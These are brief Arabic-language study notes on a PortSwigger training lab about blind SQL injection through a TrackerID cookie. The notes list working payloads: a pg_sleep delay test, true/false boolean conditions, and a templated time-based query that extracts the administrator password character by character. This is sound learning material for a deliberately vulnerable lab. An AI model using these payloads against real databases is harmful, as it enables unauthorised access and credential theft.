# Lab: Blind SQL injection with conditional responses

https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

- الفكره من الLab ده ان SQL BLIND علشان كده انت مش هتشوف ناتج وكل حاجه هتبقي مخفيه
- والcookies لو اتمسحت الموقع بيكمل عادي
- علشان كده احنا هنعتمد علي parameter في cookies اسمها TrackerID هنحاول نلعب علي delay والتكرار وممكن نستخدم ادوات ذي Intruder AND  FUZZ

```bash
1. '||pg_sleep(10)-- ==> ولا لا Delay احد طرق اختبار الموقع بشوف هل هيعمل 

2. ' AND '1'='2

3. ' AND '1'='1

4. '||(SELECT CASE WHEN (SUBSTRING(password,$1$,1)='$s$') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--  ==> time delay عنطريق  databaseده الكود الي هيقعد يتكرر الحاد اما اطلع كلمت السر من ال
```
